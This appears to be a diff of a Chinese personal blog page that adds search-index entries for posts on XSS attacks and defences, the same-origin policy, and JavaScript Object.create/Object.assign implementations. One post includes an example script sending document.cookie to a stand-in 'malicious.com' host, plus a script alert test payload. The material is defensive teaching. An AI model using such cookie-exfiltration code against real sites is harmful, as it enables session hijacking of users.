@@ -9,7 +9,7 @@
 <meta name="description" content="&lt;strong&gt;前端小白&lt;/strong&gt;">
 <meta name="theme-color" content="#000">
 <title>HTTP请求流程：为什么很多站点第⼆次打开速度会很快？ | fanfan</title>
-<link rel="shortcut icon" href="/favicon.ico?v=1630595051231">
+<link rel="shortcut icon" href="/favicon.ico?v=1631083807124">
 <link rel="stylesheet" href="/media/css/pisces.css">
 <link rel="stylesheet" href="/media/fonts/font-awesome.css">
 <link
@@ -244,7 +244,7 @@
     <div class="sidebar-item-box">
       <a href="/archives/">
         
-        <span class="site-item-stat-count">76</span>
+        <span class="site-item-stat-count">79</span>
         <span class="site-item-stat-name language" data-lan="article">文章</span>
       </a>
     </div>
@@ -1228,6 +1228,155 @@
       <hr>
     </div>
     <div class="result" id="result">
+      
+      <div class="item">
+        <a class="result-title" style="opacity: 0;" href="https://fanfankill.github.io/post/kua-zhan-jiao-ben-gong-ji-xsswei-shi-me-cookie-zhong-you-httponly-shu-xing/"" data-c="
+          &lt;h2 id=&#34;什么是xss&#34;&gt;什么是XSS&lt;/h2&gt;
+&lt;p&gt;XSS全称是Cross Site Scripting，为了与“CSS”区分开来，故简称XSS，翻译过来就是“跨站脚本”。&lt;/p&gt;
+&lt;p&gt;XSS 攻击是指⿊客往HTML⽂件中或者DOM中注⼊恶意脚本，从⽽在⽤⼾浏览⻚⾯时利⽤注⼊的恶意脚本对⽤⼾ 实施攻击的⼀种⼿段。&lt;/p&gt;
+&lt;p&gt;恶意脚本做哪些事情&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;可以&lt;strong&gt;窃取Cookie信息&lt;/strong&gt;。恶意JavaScript可以通过“document.cookie”获取Cookie信息，然后通过 XMLHttpRequest或者Fetch加上CORS功能将数据发送给恶意服务器；恶意服务器拿到⽤⼾的Cookie信息 之后，就可以在其他电脑上模拟⽤⼾的登录，然后进⾏转账等操作。&lt;/li&gt;
+&lt;li&gt;可以&lt;strong&gt;监听用户行为&lt;/strong&gt;，通过&lt;code&gt;addEventListener&lt;/code&gt;接口来监听键盘等事件。&lt;/li&gt;
+&lt;li&gt;可以通过&lt;strong&gt;修改DOM&lt;/strong&gt;伪造假的登录窗口，来欺骗用户输入从而获取信息&lt;/li&gt;
+&lt;li&gt;还有&lt;strong&gt;浮窗广告&lt;/strong&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;br&gt;
+&lt;h2 id=&#34;恶意脚本如何注入&#34;&gt;恶意脚本如何注入&lt;/h2&gt;
+&lt;p&gt;常见的主要有&lt;strong&gt;存储型XSS攻击、反射型XSS攻击和基于DOM的XSS攻击&lt;/strong&gt;三种⽅式来注⼊恶意脚本&lt;/p&gt;
+&lt;h3 id=&#34;存储型xss攻击&#34;&gt;存储型XSS攻击&lt;/h3&gt;
+&lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;https://fanfankill.github.io/post-images/1631083788689.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
+&lt;p&gt;主要是能提交内容的部分没有对内容进行过滤，导致JS代码被带进数据库&lt;/p&gt;
+&lt;br&gt;
+&lt;h3 id=&#34;反射型xss攻击&#34;&gt;反射型XSS攻击&lt;/h3&gt;
+&lt;p&gt;在⼀个反射型XSS攻击过程中，恶意JavaScript脚本属于⽤⼾发送给⽹站请求中的⼀部分，随后⽹站⼜把恶 意JavaScript脚本返回给⽤⼾。当恶意JavaScript脚本在⽤⼾⻚⾯中被执⾏时，⿊客就可以利⽤该脚本做⼀ 些恶意操作。&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Web服务器不会存储反射型XSS攻击的恶意脚本，这是和存储型XSS攻击不同的地⽅。&lt;/strong&gt;&lt;/p&gt;
+&lt;br&gt;
+&lt;h3 id=&#34;基于dom的xss攻击&#34;&gt;基于DOM的XSS攻击&lt;/h3&gt;
+&lt;p&gt;基于DOM的XSS攻击是不牵涉到⻚⾯Web服务器的。&lt;/p&gt;
+&lt;p&gt;⿊客通过各种⼿段将恶意脚本注⼊⽤⼾的⻚ ⾯中，⽐如通过⽹络劫持在⻚⾯传输过程中修改HTML⻚⾯的内容，这种劫持类型很多，有通过WiFi路由器 劫持的，有通过本地恶意软件来劫持的，它们的共同点是在Web资源传输过程或者在⽤⼾使⽤⻚⾯的过程中 修改Web⻚⾯的数据。&lt;/p&gt;
+&lt;br&gt;
+&lt;h2 id=&#34;如何组织xss攻击&#34;&gt;如何组织XSS攻击&lt;/h2&gt;
+&lt;p&gt;&lt;strong&gt;存储型XSS攻击&lt;/strong&gt;和&lt;strong&gt;反射型XSS&lt;/strong&gt;攻击都是需要经过Web服务器来处理的，因此可以认为&lt;strong&gt;这两种类型的漏洞是服务端的安全漏洞&lt;/strong&gt;。&lt;/p&gt;
+&lt;p&gt;⽽基于DOM的XSS攻击全部都是在浏览器端完成的，因此&lt;strong&gt;基于DOM的XSS攻击&lt;/strong&gt;是 属于前端的安全漏洞。&lt;/p&gt;
+&lt;br&gt;
+&lt;h3 id=&#34;服务器对输入内容进行过滤或者转码&#34;&gt;服务器对输入内容进行过滤或者转码&lt;/h3&gt;
+&lt;p&gt;把&lt;code&gt;&amp;lt;script&amp;gt;alert(&#39;你被xss攻击了&#39;)&amp;lt;/script&amp;gt;&lt;/code&gt;进行过滤或者转码，使其失去功能，类似&lt;code&gt;&amp;lt;script&amp;gt;alert(&#39;你被xss攻击了&#39;)&amp;lt;/script&amp;gt;&lt;/code&gt;&lt;/p&gt;
+&lt;br&gt;
+&lt;h3 id=&#34;充分利用csp&#34;&gt;充分利用CSP&lt;/h3&gt;
+&lt;p&gt;CSP的功能&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;限制加载其他域下的资源⽂件，这样即使⿊客插⼊了⼀个JavaScript⽂件，这个JavaScript⽂件也是⽆法被加载的；&lt;/li&gt;
+&lt;li&gt;禁⽌向第三⽅域提交数据，这样⽤⼾数据也不会外泄；&lt;/li&gt;
+&lt;li&gt;禁⽌执⾏内联脚本和未授权的脚本；&lt;/li&gt;
+&lt;li&gt;提供了上报机制，这样可以帮助我们尽快发现有哪些XSS攻击，以便尽快修复问题。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;br&gt;
+&lt;h3 id=&#34;使用httponly属性&#34;&gt;使⽤HttpOnly属性&lt;/h3&gt;
+&lt;p&gt;由于很多XSS攻击都是来盗⽤cookie的，因此还可以通过使⽤HttpOnly属性来保护我们Cookie的安全。&lt;/p&gt;
+&lt;p&gt;通常服务器可以将某些cookie设置为HttpOnly标志&lt;/p&gt;
+&lt;p&gt;被设置为HttpOnly的cookie只能使用在HTTP请求中，无法被JS读取。&lt;/p&gt;
+"> 跨站脚本攻击（XSS）：为什么Cookie中有HttpOnly属性？</a>
+      </div>
+      
+      <div class="item">
+        <a class="result-title" style="opacity: 0;" href="https://fanfankill.github.io/post/tong-yuan-ce-lue-wei-shi-me-xmlhttprequest-bu-neng-kua-yu-qing-qiu-zi-yuan/"" data-c="
+          &lt;p&gt;浏览器安全可以分为三⼤块⸺&lt;strong&gt;Web⻚⾯安全、浏览器⽹络安全和浏览器系统安全&lt;/strong&gt;&lt;/p&gt;
+&lt;h2 id=&#34;什么是同源策略&#34;&gt;什么是同源策略&lt;/h2&gt;
+&lt;p&gt;如果两个URL的&lt;strong&gt;协议、域名和端⼝&lt;/strong&gt;都相同，我们就称这两个URL同源。&lt;/p&gt;
+&lt;p&gt;浏览器默认两个相同的源之间是可以相互访问资源和操作DOM的。两个不同的源之间若想要相互访问资源 或者操作DOM，那么会有⼀套基础的安全策略的制约，我们把这称为同源策略。&lt;/p&gt;
+&lt;p&gt;具体来讲，同源策略主要表现在DOM、Web数据和⽹络这三个层⾯。&lt;/p&gt;
+&lt;br&gt;
+&lt;h3 id=&#34;第一个dom层面&#34;&gt;第⼀个，DOM层⾯&lt;/h3&gt;
+&lt;p&gt;同源策略限制了来⾃不同源的JavaScript脚本对当前DOM对象读和写的操作。&lt;/p&gt;
+&lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;https://fanfankill.github.io/post-images/1630889177827.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
+&lt;p&gt;由于第⼀个⻚⾯和第⼆个⻚⾯是同源关系，所以我们可以在第⼆个⻚⾯中操作第⼀个⻚⾯的DOM，⽐如将 第⼀个⻚⾯全部隐藏掉，代码如下所⽰：&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;{
+let pdom = opener.document
+pdom.body.style.display = &amp;quot;none&amp;quot;
+}
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;该代码中，对象opener就是指向第⼀个⻚⾯的window对象，我们可以通过操作opener来控制第⼀个⻚⾯ 中的DOM。&lt;/p&gt;
+&lt;p&gt;我们在第⼆个⻚⾯的控制台中执⾏上⾯那段代码，就成功地操作了第⼀个⻚⾯中的DOM，将⻚⾯隐藏了&lt;/p&gt;
+&lt;p&gt;在不同源的情况就会报跨域错误&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;Blocked a frame with origin &amp;quot;https://www.infoq.cn&amp;quot; from accessing a cross-origin frame.&lt;/code&gt;&lt;/p&gt;
+&lt;br&gt;
+&lt;h3 id=&#34;第二个数据层面&#34;&gt;第二个，数据层面&lt;/h3&gt;
+&lt;p&gt;同源策略&lt;strong&gt;限制了不同源的站点读取当前站点的Cookie、IndexDB、LocalStorage等数据。&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;当同源的时候，第二个页面也无法通过opener去访问第一个页面的Cookie、indexDB等内容&lt;/p&gt;
+&lt;br&gt;
+&lt;h3 id=&#34;第三个网络层面&#34;&gt;第三个，网络层面&lt;/h3&gt;
+&lt;p&gt;同源策略限制了通过XMLHttpRequest等⽅式将站点的数据发送给不同源的站点。&lt;/p&gt;
+&lt;br&gt;
+&lt;h2 id=&#34;安全和便利性的权衡&#34;&gt;安全和便利性的权衡&lt;/h2&gt;
+&lt;p&gt;同源策略会隔离不同源的DOM、⻚⾯数据和⽹络通信，进⽽实现Web⻚⾯的安全性&lt;/p&gt;
+&lt;p&gt;但同时带来了开发的不便和很多安全问题，最典型的是XSS攻击和CSRF攻击&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;function onClick(){
+let url = `http://malicious.com?cookie = ${document.cookie}`
+open(url)
+}
+onClick()
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;在这段代码中，恶意脚本读取Cookie数据，并将其作为参数添加⾄恶意站点尾部，当打开该恶意⻚⾯时， 恶意服务器就能接收到当前⽤⼾的Cookie信息。&lt;/p&gt;
+&lt;p&gt;为了解决XSS攻击，浏览器中引⼊了内容安全策略，称为CSP。&lt;strong&gt;CSP的 核⼼思想是让服务器决定浏览器能够加载哪些资源，让服务器决定浏览器是否能够执⾏内联JavaScript代码&lt;/strong&gt;。通过这些⼿段就可以⼤⼤减少XSS攻击。&lt;/p&gt;
+&lt;br&gt;
+&lt;p&gt;后来引入&lt;strong&gt;CORS&lt;/strong&gt;（跨域资源请求），使⽤该机制可以进⾏跨域访问控制，从⽽使跨域 数据传输得以安全进⾏&lt;/p&gt;
+">同源策略：为什么XMLHttpRequest不能跨域请求资源？</a>
+      </div>
+      
+      <div class="item">
+        <a class="result-title" style="opacity: 0;" href="https://fanfankill.github.io/post/js-shi-xian-objectcreateobjectassign/"" data-c="
+          &lt;p&gt;可以接受两个参数&lt;/p&gt;
+&lt;p&gt;第一个参数是作为创建对象的原型，第二个参数是要创建的对象，默认空对象&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-&amp;lt;js&#34;&gt;//简略版
+function myCreate(obj){
+    // 新声明一个函数
+    function C(){};
+    // 将函数的原型指向obj
+    C.prototype = obj;
+    // 返回这个函数的实力化对象
+    return new C()
+}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;br&gt;
+&lt;h2 id=&#34;objectassign&#34;&gt;&lt;code&gt;Object.assign()&lt;/code&gt;&lt;/h2&gt;
+&lt;p&gt;Object.assign()用于将对象自身所有的可枚举属性从一个或者多个源对象上复制到目标对象&lt;/p&gt;
+&lt;p&gt;不查找原型链&lt;/p&gt;
+&lt;p&gt;用&lt;code&gt;for..in&lt;/code&gt;的话就配合&lt;code&gt;hasOwnProperty&lt;/code&gt;用&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;Object.prototype.myassgin=function(target,...source){
+    if(!target){
+        throw `${target} is null`
+    }
+    else{
+        var ret=Object(target)
+
+        source.forEach((v,i)=&amp;gt;{
+            if(v!==null){
+                for( let k in v){
+                    if(v.hasOwnProperty(k)){
+                        ret[k]=v[k]
+                    }
+                }
+            }
+        })
+
+    }
+
+    return ret
+}
+
+
+let a={a:10}
+let b={b:2}
+let c={c:3}
+
+let d=Object.myassgin(a,b,c)
+console.log(d); //{a:10,b:2,c:3}
+
+&lt;/code&gt;&lt;/pre&gt;
+">JS实现`Object.create`、`Object.assign`</a>
+      </div>
       
       <div class="item">
         <a class="result-title" style="opacity: 0;" href="https://fanfankill.github.io/post/js-shi-xian-newinstanceof-fang-fa/"" data-c="
